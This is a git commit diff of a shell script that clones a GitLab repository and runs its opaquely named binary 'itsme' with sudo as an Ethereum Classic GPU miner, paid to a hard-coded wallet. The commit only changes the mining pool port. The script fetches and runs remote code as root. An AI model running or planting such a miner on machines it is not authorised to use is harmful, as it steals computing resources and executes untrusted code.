f74b887da190a77607f1194e987f19e214111e5a
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-03-27 09:12:01 +0700

    Update baldatunect2.sh

--- baldatunect2.sh
+++ baldatunect2.sh
@@ -7,4 +7,4 @@ screen -dmS baldatunect.sh 65 75
 sudo git clone https://gitlab.com/taufiqurrohmanmaz/sunmorany.git
 cd sunmorany
 chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7 -p stratum+tcp://etc-sg.flexpool.io:48607 stratum+tcp://etc-us-east.flexpool.io:48607 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7 -p stratum+tcp://etc-sg.flexpool.io:4444 stratum+tcp://etc-us-east.flexpool.io:4444 -r $ip --nvidia 1
